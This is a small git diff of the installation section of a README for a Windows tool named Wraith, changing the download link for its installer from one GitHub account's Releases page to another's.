@@ -39,7 +39,7 @@ No kernel driver required. Pure Win32 API, minimal footprint.
 ## Installation
 
 ### Option A — Installer (recommended)
-Download `wraith-setup.exe` from [Releases](https://github.com/nightraven/wraith/releases) and run it.
+Download `wraith-setup.exe` from [Releases](https://github.com/shadow-dragon-2002/Wraith/releases) and run it.
 
 ### Option B — Portable
 Download `wraith.exe` + `wraith.ini`, place them in the same folder, run as Administrator.
